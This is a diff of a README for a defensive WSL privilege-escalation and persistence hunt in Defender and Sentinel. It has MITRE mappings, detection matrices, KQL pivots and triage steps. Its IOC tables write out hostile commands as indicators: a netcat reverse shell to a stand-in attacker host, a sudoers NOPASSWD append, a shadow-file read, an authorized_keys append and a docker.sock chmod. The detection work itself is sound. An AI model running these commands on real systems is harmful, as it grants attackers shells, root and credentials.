@@ -1,202 +1,184 @@
 # WSL Privilege Escalation & Persistence Detection  
-Author: Ala Dabat  
-Category: Privilege Escalation / Persistence / Host Escape  
-Platform: MDE / Microsoft Sentinel  
-Version: Engineering Pack – Behavioural Detection Model
+Author: **Ala Dabat**  
+Category: **Privilege Escalation / Persistence / Host Escape**  
+Platform: **Microsoft Defender for Endpoint / Microsoft Sentinel**  
+Version: **Core Hunt Pack – Behaviour-Driven Analytic**
 
-This README provides a full analysis of WSL-based threat behaviour, including the detection matrix, MITRE mapping, IOC catalogue, behavioural logic definitions, kill-chain implications, and SOC triage guidance.  
-This module is designed to accompany the WSL Priv Esc & Persistence KQL analytic rule.
+This document provides a complete technical reference for the WSL PrivEsc & Persistence detection analytic, including MITRE ATT&CK mappings, behaviour surfaces, IOC catalogue, threat detection matrices, triage steps, and IR-ready pivot tables.
 
----
-
-# 1. Introduction
-
-Windows Subsystem for Linux (WSL) introduces a hybrid execution layer where Linux binaries, filesystems, and privilege models operate inside Windows. This creates an expanded attack surface that adversaries use for:
-
-- Privilege escalation via root-level shells  
-- Abuse of WSL to escape the Linux boundary and modify Windows host paths  
-- Execution of reverse shells and network utilities  
-- Manipulation of critical security files such as /etc/shadow and /etc/sudoers  
-- Persistence through SSH keys or custom Linux scripts  
-- Abusing docker.sock to escalate privileges to full host compromise  
-- Launching malicious WSL sessions from high-risk parents such as mshta, rundll32, wscript, regsvr32  
-
-This README codifies how WSL abuse is detected through behaviour, not signatures.
-
----
-~~~
-+-----------------------------+------------+---------------------------------------------------------------+
-| MITRE Technique | ID | Detection Surface |
-+-----------------------------+------------+---------------------------------------------------------------+
-| WSL Command Execution | T1059.004 | Suspicious WSL invocations (wsl.exe, bash.exe, wslhost.exe) |
-| Command-Line Interaction | T1059 | Root flags, dangerous system options |
-| Linux Privilege Escalation | T1548 | /etc/shadow, /etc/sudoers modification |
-| Credential Access | T1003 | Access to Linux authentication databases |
-| Container Escape | T1611 | Host mount abuse (/mnt/c/Windows etc.) |
-| Persistence via SSH | T1098.004 | Modification of authorized_keys under root |
-| Misuse of Docker Socket | T1611.001 | Writes to /var/run/docker.sock |
-| Reverse Shell Execution | T1105 | nc/python/curl execution patterns |
-| Masquerading / LOLBin Use | T1036 | mshta/wscript/rundll32 launching WSL |
-+-----------------------------+------------+---------------------------------------------------------------+
-~~~
+The purpose of this hunt is to identify **any adversarial use of Windows Subsystem for Linux (WSL)** for privilege escalation, credential access, persistence, reverse shells, or Windows host boundary escape.
 
 ---
 
-# 3. Threat Detection Matrix (Coverage Overview)
+# 1. Overview
 
-~~~
+WSL introduces a Linux execution boundary inside Windows. Attackers increasingly use WSL because:
 
-+-----------------------------------------------------------+----------+--------------------------------------------------------------+
-| Threat Category | Detected | Notes |
-+-----------------------------------------------------------+----------+--------------------------------------------------------------+
-| WSL launched with root flags (--system, -u root) | YES | High-risk flag detection |
-| WSL launched by LOLBins | YES | Parent process validation |
-| Reverse shells executed inside WSL | YES | Regex for nc/curl/wget/python exec chains |
-| Host escape via --mount /mnt/c/Windows | YES | Host boundary crossing patterns |
-| Access to /etc/shadow or /etc/sudoers | YES | Critical path monitoring |
-| SSH persistence (/root/.ssh/authorized_keys) | YES | SSH persistence detection |
-| docker.sock abuse | YES | Maps to container escape |
-| Dangerous 777/666 file permission changes | YES | AdditionalFields inspection |
-| Interactive WSL usage | NO | Excluded to reduce false positives |
-| Benign developer usage | NO | Score threshold blocks noise |
-| WSL malware without dangerous flags | NO | Behaviour incomplete |
-+-----------------------------------------------------------+----------+--------------------------------------------------------------+
+- It can run Linux binaries unnoticed by traditional Windows-focused tooling  
+- It provides a direct pathway to modify the Windows filesystem  
+- It enables root-level interactive shells  
+- It allows modification of Linux credential stores (/etc/shadow, /etc/sudoers)  
+- It supports covert persistence mechanisms (SSH keys, cron jobs)  
+- It is often launched by LOLBins to bypass application control  
+- It can interact with docker.sock for container escape → full host compromise  
 
-~~~
+This analytic focuses on **behaviour**, not signatures, making it resilient to variant, renamed, or obfuscated WSL chains.
 
+---
+
+# 2. MITRE ATT&CK Mapping
+
+| Technique | ID | Relevance |
+|----------|----|-----------|
+| Command & Scripting Interpreter (WSL) | T1059.004 | Execution of wsl.exe, bash.exe, wslhost.exe |
+| Linux Privilege Escalation | T1548 | Root elevation flags, sudoers modification |
+| Credential Access (Linux Shadow File) | T1003 | Reads/writes to /etc/shadow or /etc/passwd |
+| Exploit Container / Boundary Escape | T1611 | Writes/mounts targeting Windows paths or docker.sock |
+| Persistence (SSH Authorized Keys) | T1098.004 | Creation/alteration of ~/.ssh/authorized_keys |
+| Masquerading / LOLBin Abuse | T1036 | mshta, rundll32, wscript launching WSL |
+| Ingress Tool Transfer | T1105 | Reverse shell / external payload fetch via curl/wget/python |
+| Account Manipulation | T1098 | Privilege modification inside Linux VM |
+| Execution | T1204 | User/attacker-initiated WSL subsystem execution |
+
+---
+
+# 3. Threat Detection Matrix
+
+| Behaviour Category | Detected | Notes |
+|--------------------|----------|-------|
+| WSL launched with root/system flags | YES | --system, -u root, debug shells |
+| WSL launched by LOLBins | YES | mshta, wscript, rundll32 |
+| Linux reverse shells (nc, python, curl) | YES | Regex patterns validated |
+| Host escape via mount of Windows paths | YES | /mnt/c/Windows, mount operations |
+| Modification of /etc/shadow | YES | Direct read/write detection |
+| Modification of /etc/sudoers | YES | Identified via keyword + file action |
+| SSH key persistence | YES | Writes to ~/.ssh/authorized_keys |
+| docker.sock abuse | YES | Critical for container escape |
+| Benign developer WSL use | NO | Scoring excludes low-risk patterns |
+| Simple interactive WSL shells | NO | Prevent false alerts |
 
 ---
 
 # 4. Behavioural Logic Model
 
-The detection logic is derived from three independent behavioural surfaces:
+## 4.1 Suspicious WSL Execution
+Flagged when WSL binaries appear with:
 
-## 4.1 Suspicious WSL Execution  
-A WSL binary is considered suspicious when its command-line contains any of the following patterns:
+- Root elevation flags (`--system`, `--user root`, `--debug-shell`)  
+- Privileged file access (`/etc/shadow`, `/etc/sudoers`)  
+- Reverse shell command patterns  
+- Mount operations referencing Windows host paths  
+- Abnormal parents (mshta.exe, wscript.exe, rundll32.exe, installutil.exe)
 
-- Root or system elevation flags  
-- Access to sensitive Linux credentials  
-- Reverse shell parameters  
-- Mount operations involving Windows host paths  
-- High-risk parents such as mshta.exe or rundll32.exe  
+## 4.2 Critical Path Interaction
+Direct file access or modification of:
 
-This reflects known post-exploitation behaviours where adversaries attempt to:
+- `/etc/shadow` → credential access  
+- `/etc/sudoers` → privilege escalation  
+- `/root/.ssh/authorized_keys` → persistence  
+- `/var/run/docker.sock` → container escape and lateral movement  
 
-- Escape sandboxing  
-- Escalate to root  
-- Execute payloads in a Linux environment undetected  
-- Interact with the underlying host filesystem  
+## 4.3 Scoring + Kill Chain Assignment
+Events are scored by:
 
-## 4.2 Critical Security File Modification  
-Direct writes, permission changes, or creation of:
+- **Risk of privilege escalation**
+- **Risk to credential stores**
+- **Use of LOLBins as parents**
+- **Reverse shell indicators**
+- **Host boundary access**
 
-- /etc/shadow  
-- /etc/sudoers  
-- /root/.ssh/authorized_keys  
-- /var/run/docker.sock  
+Kill chain stages include:
 
-These actions align with privilege escalation, persistence, and container escape techniques.
-
-## 4.3 Scoring and Kill Chain Classification  
-Actions are mapped to:
-
-- Privilege Escalation  
-- Credential Access  
-- Container Escape  
-- Persistence  
 - Execution  
-
-The classification assists SOC analysts in determining exploit phase and required response urgency.
+- Privilege Escalation  
+- Persistence  
+- Credential Access  
+- Lateral Movement  
+- Impact  
 
 ---
 
 # 5. IOC Catalogue
 
-~~~
-
-+---------------------------+--------------------------------------------------------------+
-| IOC Type | Example |
-+---------------------------+--------------------------------------------------------------+
-| Dangerous Root Flag | wsl.exe --system |
-| Host Escape Attempt | wsl.exe --mount /mnt/c/Windows/System32 |
-| Reverse Shell | bash -c "nc attacker.com 4444 -e /bin/bash" |
-| Credential File Access | bash -c "cat /etc/shadow" |
-| Sudoers Modification | echo 'ALL ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers |
-| SSH Persistence | echo "ssh-rsa AAA..." >> /root/.ssh/authorized_keys |
-| Docker Abuse | chmod 777 /var/run/docker.sock |
-| LOLBin Parent Invocation | mshta.exe launching wsl.exe |
-+---------------------------+--------------------------------------------------------------+
-~~~
+| IOC Type | Indicator Example |
+|----------|-------------------|
+| Root Flag | `wsl.exe --system` |
+| sudoers Edit | `echo 'ALL ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers` |
+| Reverse Shell | `bash -c "nc 10.10.10.10 4444 -e /bin/bash"` |
+| Credential Access | `cat /etc/shadow` |
+| SSH Persistence | `>> /root/.ssh/authorized_keys` |
+| docker.sock Abuse | `chmod 777 /var/run/docker.sock` |
+| Host Escape Attempt | `--mount /mnt/c/Windows/System32` |
+| LOLBin Parent | `mshta.exe -> wsl.exe` |
 
 ---
 
 # 6. Kill Chain Alignment
 
-~~~
-+---------------------------+--------------------------+----------------------------------------------+
-| Kill Chain Stage | Behaviour | Detection |
-+---------------------------+--------------------------+----------------------------------------------+
-| Initial Access | LOLBins launching WSL | Parent-child correlation |
-| Execution | Reverse shells | Network exec pattern detection |
-| Privilege Escalation | Root flags, shadow edit | Critical path monitoring |
-| Persistence | SSH key additions | Authorized_keys detection |
-| Defense Evasion | WSL boundary use | SuspiciousExec scoring |
-| Credential Access | Reading /etc/shadow | File perms and path tracking |
-| Lateral Movement | Docker abuse | docker.sock detection |
-| Impact / Host Compromise | Full host escape | Mount path rules |
-+---------------------------+--------------------------+----------------------------------------------+
-~~~
+| Phase | Example Behaviour | Detection Surface |
+|-------|------------------|-------------------|
+| Initial Access | LOLBins launching WSL | Parent-child validation |
+| Execution | Linux payload execution | WSL process telemetry |
+| Privilege Escalation | sudoers/shadow manipulation | File event analysis |
+| Persistence | SSH authorized key changes | File write activity |
+| Credential Access | shadow/passwd extraction | Path + command-line |
+| Lateral Movement | docker.sock exploitation | Host boundary events |
+| Impact | Full host takeover | Mount operations |
 
 ---
 
-# 7. Analyst Workflow and Triage Guidance
+# 7. IR Pivot Table (SOC Analyst Quick Reference)
 
-When a detection occurs:
+| Objective | Pivot Query (Sentinel/MDE) |
+|-----------|----------------------------|
+| Find all WSL parents | `DeviceProcessEvents | where FileName =~ "wsl.exe" | summarize by InitiatingProcessFileName` |
+| Check credential file reads | `DeviceFileEvents | where FolderPath has "/etc/shadow"` |
+| Identify reverse shells | `DeviceProcessEvents | where ProcessCommandLine matches regex "nc .* -e"` |
+| Identify host escape | `DeviceProcessEvents | where ProcessCommandLine has "/mnt/c/Windows"` |
+| SSH persistence | `DeviceFileEvents | where FileName =~ "authorized_keys"` |
+| docker.sock misuse | `DeviceFileEvents | where FolderPath has "docker.sock"` |
+| Cross-host blast radius | `DeviceProcessEvents | where ProcessCommandLine has_any("wsl","bash") | summarize count() by DeviceName` |
 
-## Step 1 – Validate the Parent Process  
-- Was the WSL command initiated by a normal shell or a high-risk parent such as mshta.exe?  
-- Unexpected parent → higher probability of exploitation.
+---
 
-## Step 2 – Inspect Command Line  
-- Presence of root flags or attempts to interact with /etc/shadow or /etc/sudoers indicates escalation.  
-- Reverse shell parameters indicate immediate post-exploitation activity.
+# 8. Analyst Workflow & Response Guide
 
-## Step 3 – Review File Events  
-- Permission escalations on shadow/sudoers files are rarely legitimate.  
-- docker.sock modifications imply container escape or lateral movement into infrastructure services.
+### Step 1 — Validate Parent Process  
+- Normal shell? Low suspicion.  
+- LOLBin parent? High suspicion → escalate immediately.
 
-## Step 4 – Determine Intent  
-- Persistence through SSH keys  
-- Credential harvesting  
-- Escape into Windows paths  
-- Privilege escalation attempts
+### Step 2 — Inspect Command Line  
+Look for root flags, Windows path access, reverse shell patterns.
 
-## Step 5 – Identify Blast Radius  
-- Query for similar command-lines across fleet  
-- Determine whether automated scripts or malware families were deployed  
-- Validate identity and authentication logs for associated accounts
+### Step 3 — Validate File Events  
+Any modification of `/etc/shadow`, `/etc/sudoers`, or `authorized_keys` = critical.
 
-## Step 6 – Response Actions  
-- Isolate affected host  
+### Step 4 — Determine Intent  
+- Escalation  
+- Persistence  
+- Exfiltration  
+- Host escape  
+- Docker/container misuse
+
+### Step 5 — Assess Blast Radius  
+Check for similar events across fleet.
+
+### Step 6 — Containment Actions  
+- Isolate host  
 - Reset credentials  
-- Block WSL execution pending investigation if necessary  
-- Review scheduled tasks or persistence artifacts  
-- Validate Docker and container runtime integrity  
+- Review scheduled tasks  
+- Validate Docker/container integrity  
+- Lock down WSL usage policy if necessary  
 
 ---
 
-# 8. Notes for Detection Engineering
+# 9. Detection Engineering Notes
 
-- Root-level Linux operations inside WSL must be treated as high-risk unless explicitly allowed.  
-- Cross-boundary access to Windows directories represents a known container escape vector.  
-- Permission changes to critical files map directly to escalation and persistence.  
-- High-risk parent processes invoking WSL are a common signature of loader chains and fileless malware.  
-- Triage should incorporate identity logs, network logs, and application logs in Sentinel for full context.
+- WSL acts as an “EDR blind spot” for many orgs.  
+- Behavioural signals are strong and stable across variants.  
+- High-risk parents launching WSL are often part of loader chains.  
+- Host escape attempts require immediate escalation.
 
 ---
 
 # End of README
-
-
-# 2. MITRE ATT&CK Mapping
-
